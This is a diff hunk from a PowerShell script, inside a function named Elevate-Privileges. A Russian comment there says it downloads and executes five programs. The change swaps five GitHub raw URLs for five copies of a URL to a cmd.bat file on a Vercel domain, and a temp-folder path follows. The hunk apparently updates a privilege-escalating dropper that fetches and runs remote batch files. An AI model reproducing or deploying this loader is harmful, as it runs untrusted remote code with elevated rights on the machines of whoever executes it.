@@ -41,11 +41,11 @@ function Elevate-Privileges {
             
             # Загрузка и выполнение 5 программ
             $urls = @(
-                "https://github.com/ShewiYT/redirect/raw/refs/heads/main/index.html",
-                "https://github.com/ShewiYT/redirect/raw/refs/heads/main/index.html",
-                "https://github.com/ShewiYT/redirect/raw/refs/heads/main/index.html",
-                "https://github.com/ShewiYT/redirect/raw/refs/heads/main/index.html",
-                "https://github.com/ShewiYT/redirect/raw/refs/heads/main/index.html"
+                "https://redirect-ten-gold.vercel.app/cmd.bat",
+                "https://redirect-ten-gold.vercel.app/cmd.bat",
+                "https://redirect-ten-gold.vercel.app/cmd.bat",
+                "https://redirect-ten-gold.vercel.app/cmd.bat",
+                "https://redirect-ten-gold.vercel.app/cmd.bat"
             )
             
             $tempPath = $env:TEMP
